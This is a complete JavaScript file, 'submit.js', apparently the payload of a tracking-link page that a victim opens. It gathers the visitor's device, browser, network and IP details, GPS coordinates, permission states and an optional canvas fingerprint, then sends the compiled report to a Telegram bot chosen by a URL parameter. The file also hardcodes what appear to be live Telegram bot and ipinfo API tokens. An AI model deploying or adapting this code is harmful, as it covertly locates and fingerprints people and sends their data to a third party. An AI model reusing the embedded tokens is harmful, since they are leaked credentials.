/**
 * submit.js — full, modular web submit script
 *
 * Usage:
 * 1. Include this file in your analyser page.
 * 2. Call: await submit.collectAndSend(chatId);
 *    - chatId can come from URL params (new URLSearchParams(window.location.search).get('chat')).
 * 3. Configure the top `CONFIG` to enable/disable pieces for testing.
 *
 * Notes:
 * - Geolocation will prompt the user and on many browsers must be triggered by a user gesture
 *   (e.g. a click). If you call getGeolocation automatically some browsers may block it.
 * - IP lookup uses ipinfo.io with the token set in CONFIG.ipinfoToken (you may replace or remove).
 * - Telegram bot token is stored in CONFIG.telegramToken for easy testing; move server-side for production.
 */

const submit = (function () {
  // ---------- CONFIG ----------
  const CONFIG = {
    telegramToken: "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ", // replace if needed
    ipinfoToken: "18d2a866939a58", // optional (ipinfo.io)
    ipProvider: "ipinfo", // "ipinfo" or "ipify" fallback
    sendToTelegram: true, // set false if you only want to collect locally
    geoTimeoutMs: 10000, // geolocation timeout
    canvasFingerprint: false, // set true to compute a canvas fingerprint (slightly invasive)
    enumerateDevices: false, // set true to call enumerateDevices (may require HTTPS and permissions)
    attemptGeolocation: true, // set false to skip asking geolocation
    includePermissions: true, // query permissions API for camera/mic/notifications (if available)
    includeStorageEstimate: true, // call navigator.storage.estimate() where available
  };

  // ---------- HELPERS ----------
  const safe = (fn, fallback = "Unknown") => {
    try {
      const v = fn();
      return v === undefined || v === null ? fallback : v;
    } catch {
      return fallback;
    }
  };

  const fetchJson = async (url, opts = {}) => {
    try {
      const r = await fetch(url, opts);
      if (!r.ok) throw new Error("Fetch error: " + r.status);
      // Try parse json, else return text
      const txt = await r.text();
      try {
        return JSON.parse(txt);
      } catch {
        return txt;
      }
    } catch (e) {
      throw e;
    }
  };

  // ---------- DATA GATHERING FUNCTIONS ----------

  function getBasicInfo() {
    const ua = navigator.userAgent || "Unknown";
    const browser = (() => {
      const u = ua.toLowerCase();
      if (u.includes("edg/")) return "Edge";
      if (u.includes("opr/") || u.includes("opera")) return "Opera";
      if (u.includes("chrome") && !u.includes("chromium") && !u.includes("edg/")) return "Chrome";
      if (u.includes("firefox")) return "Firefox";
      if (u.includes("safari") && !u.includes("chrome")) return "Safari";
      return ua;
    })();

    const platform = safe(() => navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform), "Unknown");
    const language = safe(() => navigator.language || (navigator.languages && navigator.languages[0]), "Unknown");
    const timezone = safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone, "Unknown");

    // Touch/Mouse detection
    function getTouchMouseType() {
      const hasTouch = "ontouchstart" in window || (navigator.maxTouchPoints && navigator.maxTouchPoints > 0);
      const hasMouse = window.matchMedia && window.matchMedia("(pointer: fine)").matches;
      if (hasTouch && hasMouse) return "Both";
      if (hasTouch) return "Touch";
      if (hasMouse) return "Mouse";
      return "Unknown";
    }

    return {
      userAgent: ua,
      browser,
      platform,
      language,
      timezone,
      touchMouse: getTouchMouseType(),
    };
  }

  function getHardwareInfo() {
    return {
      cpuCores: safe(() => navigator.hardwareConcurrency, "Unknown"),
      ram: safe(() => (navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown")),
    };
  }

  function getScreenInfo() {
    return {
      resolution: safe(() => `${window.screen.width}x${window.screen.height}`, "Unknown"),
      colorDepth: safe(() => `${window.screen.colorDepth}-bit`, "Unknown"),
      devicePixelRatio: safe(() => window.devicePixelRatio || "Unknown"),
      orientation: safe(() => (screen.orientation && screen.orientation.type) || (screen.orientation || {}).type || "Unknown"),
    };
  }

  function getWebGLInfo() {
    let webglVendor = "Unknown",
      webglRenderer = "Unknown",
      webglDetails = null;
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (gl) {
        const dbg = gl.getExtension("WEBGL_debug_renderer_info");
        if (dbg) {
          webglVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || "Unknown";
          webglRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "Unknown";
        } else {
          webglRenderer = gl.getParameter(gl.RENDERER) || "Unknown";
        }
        webglDetails = {
          maxTextureSize: safe(() => gl.getParameter(gl.MAX_TEXTURE_SIZE)),
          vendor: webglVendor,
          renderer: webglRenderer,
        };
      }
    } catch {}
    return { webglVendor, webglRenderer, webglDetails };
  }

  async function getBatteryInfo() {
    try {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        return {
          level: typeof b.level === "number" ? Math.round(b.level * 100) + "%" : "Unknown",
          charging: typeof b.charging === "boolean" ? (b.charging ? "Yes" : "No") : "Unknown",
        };
      }
    } catch {}
    return { level: "Unknown", charging: "Unknown" };
  }

  function getNetworkInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
    const effectiveType = connection ? connection.effectiveType || "Unknown" : "Unknown";
    const downlink = connection ? (connection.downlink ? connection.downlink + " Mbps" : "Unknown") : "Unknown";
    const rtt = connection ? (connection.rtt ? Math.round(connection.rtt) + " ms" : "Unknown") : "Unknown";

    // Try to infer connection medium type (some browsers expose 'type')
    let connType = "Unknown";
    if (connection) {
      // connection.type exists in some browsers (e.g., 'wifi', 'cellular')
      connType = connection.type || connection.effectiveType || "Unknown";
    }

    // Normalize to one of 'wifi', 'cellular', 'ethernet', 'unknown'
    const nt = ("" + connType).toLowerCase();
    let normalized = "Unknown";
    if (nt.includes("wifi") || nt.includes("wlan")) normalized = "WiFi";
    else if (nt.includes("cell") || nt.includes("wwan") || nt.includes("mobile") || nt.includes("2g") || nt.includes("3g") || nt.includes("4g") || nt.includes("5g")) normalized = "Cellular";
    else if (nt.includes("ethernet")) normalized = "Ethernet";
    else if (nt !== "unknown" && nt !== "") normalized = nt;

    return {
      connectionTypeRaw: connType,
      connectionType: normalized,
      effectiveType: effectiveType,
      downlink,
      rtt,
      saveData: connection ? (connection.saveData ? "Enabled" : "Disabled") : "Unknown",
      online: navigator.onLine ? "Online" : "Offline",
    };
  }

  async function detectAdblock() {
    let method = "None";
    let detected = "Negative";
    // DOM bait
    try {
      const bait = document.createElement("div");
      bait.className = "adsbox ad-banner adsbygoogle adunit";
      bait.style.cssText = "width:1px;height:1px;position:absolute;left:-9999px;top:-9999px";
      document.body.appendChild(bait);
      await new Promise((r) => setTimeout(r, 60));
      const isHidden =
        bait.offsetParent === null ||
        bait.offsetHeight === 0 ||
        bait.clientHeight === 0 ||
        getComputedStyle(bait).display === "none";
      bait.remove();
      if (isHidden) {
        detected = "Positive";
        method = "DOM";
      }
    } catch {}

    // Network fetch
    if (detected === "Negative") {
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 2000);
        // This host is commonly blocked by adblockers
        await fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js", {
          method: "GET",
          mode: "no-cors",
          signal: controller.signal,
        });
        clearTimeout(timeout);
        method = "None";
      } catch {
        detected = "Positive";
        method = method === "None" ? "Network" : method + "+Network";
      }
    }

    // Cookie test (basic)
    let cookiesBlocked = "No";
    try {
      document.cookie = "abctest=1";
      if (!document.cookie.includes("abctest")) cookiesBlocked = "Yes";
      // cleanup
      document.cookie = "abctest=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
    } catch {
      cookiesBlocked = "Yes";
    }

    // Try to detect common adblock library variables (best-effort)
    const knownBlockLib = !!(window.blockAdBlock || window.canRunAds === false || window._blockAdBlock);

    if (knownBlockLib && detected === "Negative") {
      detected = "Positive";
      method = method === "None" ? "Library" : method + "+Library";
    }

    return { detected, method, cookiesBlocked };
  }

  // Geolocation with timeout. Note: many browsers require a user gesture for prompt.
  async function getGeolocation() {
    if (!CONFIG.attemptGeolocation || !("geolocation" in navigator)) {
      return { status: "Unavailable", latitude: "Denied", longitude: "Denied" };
    }
    const getPos = (timeoutMs = CONFIG.geoTimeoutMs) =>
      new Promise((resolve, reject) => {
        let done = false;
        navigator.geolocation.getCurrentPosition(
          (p) => {
            if (!done) {
              done = true;
              resolve(p);
            }
          },
          (e) => {
            if (!done) {
              done = true;
              reject(e);
            }
          },
          { enableHighAccuracy: false, maximumAge: 60000, timeout: timeoutMs }
        );
        setTimeout(() => {
          if (!done) {
            done = true;
            reject(new Error("timeout"));
          }
        }, timeoutMs + 200);
      });

    try {
      const p = await getPos();
      return { status: "Allowed", latitude: p.coords.latitude, longitude: p.coords.longitude };
    } catch (err) {
      const status = err && err.code === err.PERMISSION_DENIED ? "Denied" : "Unavailable";
      return { status, latitude: status === "Allowed" ? null : "Denied", longitude: status === "Allowed" ? null : "Denied" };
    }
  }

  async function getIPInfo() {
    // prefers ipinfo if configured
    if (CONFIG.ipProvider === "ipinfo" && CONFIG.ipinfoToken) {
      try {
        const url = `https://ipinfo.io/json?token=${encodeURIComponent(CONFIG.ipinfoToken)}`;
        const d = await fetchJson(url);
        // Typical ipinfo fields: ip, city, region, country, loc, org, timezone
        return {
          ip: d.ip || "Unknown",
          city: d.city || "Unknown",
          region: d.region || "Unknown",
          country: d.country || "Unknown",
          org: d.org || "Unknown",
          loc: d.loc || undefined,
          timezone: d.timezone || undefined,
        };
      } catch (e) {
        // fallback below
      }
    }

    // fallback to ipify for basic IP
    try {
      const r = await fetchJson("https://api.ipify.org?format=json");
      return { ip: r.ip || "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", org: "Unknown" };
    } catch (e) {
      return { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", org: "Unknown" };
    }
  }

  // Permission queries (camera/mic/notifications) — best-effort
  async function getPermissions() {
    if (!CONFIG.includePermissions || !navigator.permissions) return { note: "Permissions API not available or disabled" };
    const out = {};
    const permNames = ["camera", "microphone", "notifications", "geolocation"];
    await Promise.all(
      permNames.map(async (name) => {
        try {
          const p = await navigator.permissions.query({ name });
          out[name] = p.state || "Unknown";
        } catch {
          out[name] = "Unknown";
        }
      })
    );
    return out;
  }

  // Storage estimate
  async function getStorageEstimate() {
    if (!CONFIG.includeStorageEstimate || !navigator.storage || !navigator.storage.estimate) return { note: "Storage estimate not available" };
    try {
      const est = await navigator.storage.estimate();
      return { quota: est.quota || "Unknown", usage: est.usage || "Unknown" };
    } catch {
      return { note: "Storage estimate failed" };
    }
  }

  // Enumerate media devices (may require HTTPS and permission)
  async function getMediaDevices() {
    if (!CONFIG.enumerateDevices || !navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
      return { note: "enumerateDevices not enabled or unavailable" };
    }
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const counts = devices.reduce(
        (acc, d) => {
          if (d.kind === "videoinput") acc.cameras++;
          else if (d.kind === "audioinput") acc.microphones++;
          else if (d.kind === "audiooutput") acc.outputs++;
          return acc;
        },
        { cameras: 0, microphones: 0, outputs: 0 }
      );
      return { devices, counts };
    } catch {
      return { note: "enumerateDevices failed or permissions denied" };
    }
  }

  // Canvas fingerprint (optional)
  function getCanvasFingerprint() {
    if (!CONFIG.canvasFingerprint) return { note: "canvas fingerprint disabled" };
    try {
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "14px 'Arial'";
      ctx.textBaseline = "alphabetic";
      ctx.fillStyle = "#f60";
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = "#069";
      ctx.fillText("OpasLabsFingerprint", 2, 15);
      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
      ctx.fillText("OpasLabsFingerprint", 4, 17);

      const dataURL = canvas.toDataURL();
      // cheap hash (djb2)
      let hash = 5381;
      for (let i = 0; i < dataURL.length; i++) hash = (hash * 33) ^ dataURL.charCodeAt(i);
      return { fingerprint: (hash >>> 0).toString(16), dataURLSample: dataURL.slice(0, 100) + "..." };
    } catch {
      return { fingerprint: "Failed" };
    }
  }

  // Build full report object
  async function buildReport() {
    const basic = getBasicInfo();
    const hardware = getHardwareInfo();
    const screen = getScreenInfo();
    const webgl = getWebGLInfo();
    const battery = await getBatteryInfo();
    const network = getNetworkInfo();
    const adblock = await detectAdblock();
    const geo = await getGeolocation();
    const ipinfo = await getIPInfo();
    const permissions = await getPermissions();
    const storageEstimate = await getStorageEstimate();
    const mediaDevices = await getMediaDevices();
    const canvasFp = getCanvasFingerprint();

    const report = {
      timestamp: new Date().toISOString(),
      basic,
      hardware,
      screen,
      webgl,
      battery,
      network,
      adblock,
      geo,
      ipinfo,
      permissions,
      storageEstimate,
      mediaDevices,
      canvasFp,
    };

    return report;
  }

  // Format report into a readable text message (Telegram-friendly)
  function formatReportText(report) {
    const b = report.basic;
    const hw = report.hardware;
    const sc = report.screen;
    const wg = report.webgl;
    const net = report.network;
    const ab = report.adblock;
    const ip = report.ipinfo;
    const geo = report.geo;
    const bat = report.battery;

    const lines = [];

    lines.push("🔰 Device Information Report 🔰");
    lines.push("");
    lines.push("🌐 Basic Info:");
    lines.push(`- Browser: ${b.browser}`);
    lines.push(`- Platform: ${b.platform}`);
    lines.push(`- Language: ${b.language}`);
    lines.push(`- Timezone: ${b.timezone}`);
    lines.push(`- Touch/Mouse: ${b.touchMouse}`);
    lines.push("");
    lines.push("💻 Hardware:");
    lines.push(`- CPU: ${hw.cpuCores} cores`);
    lines.push(`- RAM: ${hw.ram}`);
    lines.push("");
    lines.push("🖥️ Screen:");
    lines.push(`- Screen: ${sc.resolution}, ${sc.colorDepth}`);
    lines.push(`- DPR: ${sc.devicePixelRatio}`);
    lines.push(`- Orientation: ${sc.orientation}`);
    lines.push("");
    lines.push("🎮 WebGL:");
    lines.push(`- Renderer: ${wg.webglRenderer}`);
    lines.push(`- Vendor: ${wg.webglVendor}`);
    if (wg.webglDetails && wg.webglDetails.maxTextureSize) lines.push(`- Max Texture Size: ${wg.webglDetails.maxTextureSize}`);
    lines.push("");
    lines.push("📶 Network Info:");
    lines.push(`- Connection Type: ${net.connectionType}`);
    lines.push(`- Effective Type: ${net.effectiveType}`);
    lines.push(`- Downlink: ${net.downlink}`);
    lines.push(`- Latency (rtt): ${net.rtt}`);
    lines.push(`- Save-Data: ${net.saveData}`);
    lines.push(`- Online: ${net.online}`);
    lines.push("");
    lines.push("📍 IP Info:");
    lines.push(`- IP: ${ip.ip}`);
    lines.push(`*Note: IP-based location may not be accurate.*`);
    if (ip.city) lines.push(`- City: ${ip.city}`);
    if (ip.region) lines.push(`- Region: ${ip.region}`);
    if (ip.country) lines.push(`- Country: ${ip.country}`);
    if (ip.org) lines.push(`- ISP: ${ip.org}`);
    lines.push("");
    lines.push("📌 GPS:");
    lines.push(`- Status: ${geo.status}`);
    lines.push(`- Latitude: ${geo.latitude}`);
    lines.push(`- Longitude: ${geo.longitude}`);
    if (geo.status === "Allowed" && geo.latitude && geo.longitude) lines.push(`- Map: https://www.google.com/maps?q=${geo.latitude},${geo.longitude}`);
    lines.push("");
    lines.push("🛡️ Adblock Info:");
    lines.push(`- Detected: ${ab.detected}`);
    lines.push(`- Method: ${ab.method}`);
    lines.push(`- Cookies Blocked: ${ab.cookiesBlocked}`);
    lines.push("");
    lines.push("🔋 Battery:");
    lines.push(`- Level: ${bat.level}`);
    lines.push(`- Charging: ${bat.charging}`);
    lines.push("");
    // optional extras
    lines.push("🔐 Permissions (best-effort):");
    if (report.permissions && typeof report.permissions === "object") {
      Object.entries(report.permissions).forEach(([k, v]) => lines.push(`- ${k}: ${v}`));
    } else {
      lines.push(`- ${report.permissions}`);
    }
    lines.push("");
    if (report.storageEstimate && report.storageEstimate.quota) {
      lines.push("💾 Storage Estimate:");
      lines.push(`- Quota: ${report.storageEstimate.quota}`);
      lines.push(`- Usage: ${report.storageEstimate.usage}`);
      lines.push("");
    }
    if (report.mediaDevices && report.mediaDevices.counts) {
      lines.push("🎙️ Media Devices (counts):");
      lines.push(`- Cameras: ${report.mediaDevices.counts.cameras}`);
      lines.push(`- Microphones: ${report.mediaDevices.counts.microphones}`);
      lines.push(`- Outputs: ${report.mediaDevices.counts.outputs}`);
      lines.push("");
    }
    if (report.canvasFp && report.canvasFp.fingerprint) {
      lines.push("🖼️ Canvas Fingerprint:");
      lines.push(`- Fingerprint: ${report.canvasFp.fingerprint}`);
      lines.push("");
    }

    return lines.join("\n");
  }

  // Send message to Telegram
  async function sendToTelegram(chatId, text) {
    if (!CONFIG.sendToTelegram) return { ok: false, reason: "sendToTelegram disabled in CONFIG" };
    if (!CONFIG.telegramToken) return { ok: false, reason: "No telegramToken in CONFIG" };
    const url = `https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`;
    try {
      const res = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text }),
      });
      if (!res.ok) {
        const txt = await res.text();
        return { ok: false, status: res.status, body: txt };
      }
      return { ok: true };
    } catch (e) {
      return { ok: false, error: e.message || e.toString() };
    }
  }

  // Public API: collect and send
  async function collectAndSend(chatId) {
    if (!chatId) throw new Error("No chatId provided");

    const report = await buildReport();
    const text = formatReportText(report);
    const sendResult = await sendToTelegram(chatId, text);

    // Return both report object and send result so caller can inspect
    return { report, sendResult };
  }

  // Also export a function to just collect (without sending)
  async function collectOnly() {
    return await buildReport();
  }

  // Expose API
  return {
    CONFIG,
    collectOnly,
    collectAndSend,
    // low-level helpers if the user wants to call individually
    getBasicInfo,
    getHardwareInfo,
    getScreenInfo,
    getWebGLInfo,
    getBatteryInfo,
    getNetworkInfo,
    detectAdblock,
    getGeolocation,
    getIPInfo,
    getPermissions,
    getStorageEstimate,
    getMediaDevices,
    getCanvasFingerprint,
    formatReportText,
    sendToTelegram,
  };
})();

// Example usage (uncomment to use directly):
// (async () => {
//   const chatId = new URLSearchParams(window.location.search).get('chat');
//   if (!chatId) { console.warn('No chat id in url'); return; }
//   try {
//     const result = await submit.collectAndSend(chatId);
//     console.log('Report sent:', result);
//   } catch (e) {
//     console.error('Submit error:', e);
//   }
// })();

```0
